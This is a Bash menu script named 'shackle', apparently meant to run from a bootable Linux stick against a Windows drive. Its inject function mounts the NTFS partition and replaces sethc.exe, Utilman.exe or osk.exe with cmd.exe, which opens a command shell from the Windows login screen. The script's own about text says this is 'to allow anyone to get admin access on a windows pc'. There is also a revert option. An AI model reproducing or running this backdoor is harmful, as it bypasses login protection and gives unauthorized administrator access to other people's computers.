inject() {
    clear
    printf "what exe should be replaced?\n(1) sethc.exe\n(2) utilman.exe\n(3) osk.exe\n(4) go back\n"
    read -p "> " option

    if [[ "$option" == "1" ]]; then
        exe="sethc"
    elif [[ $option == "2" ]]; then
        exe="Utilman"
    elif [[ $option == "3" ]]; then
        exe="osk"
    elif [[ $option == "4" ]]; then
        return
    else
        echo "invalid option. returning..."
        sleep 2
        return
    fi
    
    clear
    echo "!!!!!IMPORTANT!!!!!"
    echo "write out the drive that you want to inject shackle into (ex: /dev/sda1)"
    echo "if you fuck this up then its not my fault."
    echo "here's a list of drives. pick the right one!"
    echo "-----------"
    lsblk --noheadings --list --paths --output name,size -I 8
    echo "-----------"
    read -p "> " drive

    #if [[ "$drives" =~ "$drive" ]]; then
    #    echo "this drive does not exist or is not a windows drive. returning..."
    #    sleep 2
    #    return
    #fi

    clear
    echo "mounting..."
    mkdir /mnt/win
    sudo ntfs-3g $drive /mnt/win

    if [ -f /mnt/win/Windows/System32/$exe\_o.exe ]; then
        echo "file already exists! returning..."
        sudo umount /mnt/win
        sudo rm -r /mnt/win
        sleep 2
        return
    fi

    if [ ! -e /mnt/win/Windows/System32/cmd.exe ]; then
        echo "cmd does not exist! returning..."
        sudo umount /mnt/win
        sudo rm -r /mnt/win
        sleep 2
        return
    fi

    echo "injecting..."
    sudo cp /mnt/win/Windows/System32/$exe.exe /mnt/win/Windows/System32/$exe\_o.exe
    sudo cp /mnt/win/Windows/System32/cmd.exe /mnt/win/Windows/System32/$exe.exe

    echo "unmounting..."
    sudo umount /mnt/win
    sudo rm -r /mnt/win

    echo "done! returning..."
    sleep 2
    return
}

revert() {
    clear
    printf "what exe should be reverted?\n(1) sethc.exe\n(2) utilman.exe\n(3) osk.exe\n(4) go back\n"
    read -p "> " option

    if [[ "$option" == "1" ]]; then
        exe="sethc"
    elif [[ $option == "2" ]]; then
        exe="Utilman"
    elif [[ $option == "3" ]]; then
        exe="osk"
    elif [[ $option == "4" ]]; then
        return
    else
        echo "invalid option. returning..."
        sleep 2
        return
    fi
    
    clear
    echo "!!!!!IMPORTANT!!!!!"
    echo "write out the drive that you want to remove shackle from (ex: /dev/sda1)"
    echo "if you fuck this up then its not my fault."
    echo "here's a list of drives. pick the right one!"
    echo "-----------"
    lsblk --noheadings --list --paths --output name,size -I 8
    echo "-----------"
    read -p "> " drive

    #if [[ "$drives" =~ "$drive" ]]; then
    #    echo "this drive does not exist or is not a windows drive. returning..."
    #    sleep 2
    #    return
    #fi

    clear
    echo "mounting..."
    mkdir /mnt/win
    sudo ntfs-3g $drive /mnt/win

    if [ ! -e /mnt/win/Windows/System32/$exe\_o.exe ]; then
        echo "file doesn't exist! returning..."
        sudo umount /mnt/win
        sudo rm -r /mnt/win
        sleep 2
        return
    fi

    echo "reverting..."
    sudo mv /mnt/win/Windows/System32/$exe\_o.exe /mnt/win/Windows/System32/$exe.exe

    echo "umounting..."
    sudo umount /mnt/win
    sudo rm -r /mnt/win

    echo "done! returning..."
    sleep 2
    return
}

about() {
    echo "written by lukeByte"
    echo "this is a build of linux that is intended to replace an exe that is accessible from the"
    echo "login screen in order to allow anyone to get admin access on a windows pc."
    echo "here are all of the exe's that can be replaces:"
    echo "- sethc.exe (sticky keys)"
    echo "- utilman.exe (ease of access)"
    echo "- osk.exe (on screen keyboard)"
    echo "press enter to return!"
    read
    return
}

while true; do
    clear
    printf "welcome to shackle! :)\n(1) inject\n(2) revert\n(3) shell\n(4) about\n(5) exit\n"
    read -p "> " option
    case "$option" in
      1) inject ;;
      2) revert ;;
      3) ash ;;
      4) about ;;
      5) break ;;
      *) echo "invalid option" ;;
    esac
    printf "\n"
done

echo "rebooting..."
reboot
exit